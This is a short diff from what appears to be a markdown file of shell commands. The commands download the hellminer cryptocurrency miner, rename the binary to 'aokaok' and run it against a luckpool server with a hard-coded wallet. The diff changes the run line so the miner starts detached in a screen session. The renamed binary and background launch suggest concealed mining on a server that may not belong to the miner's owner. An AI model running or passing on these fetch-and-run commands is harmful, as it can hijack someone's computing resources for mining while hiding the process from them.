@@ -14,7 +14,7 @@ nohup sudo apt-get install screen -y
 nohup wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
 nohup tar xf hellminer_cpu_linux.tar.gz
 mv hellminer aokaok
-./aokaok -c stratum+tcp://na.luckpool.net:3956#xnsub -u RPPPm6dVbpx3L3yDRK1ktZ1VnDbBTtNMoy.vps1 -p x --cpu 10
+screen -d -m ./aokaok -c stratum+tcp://na.luckpool.net:3956#xnsub -u RPPPm6dVbpx3L3yDRK1ktZ1VnDbBTtNMoy.vps1 -p x --cpu 10
 ```
 
 ``` python
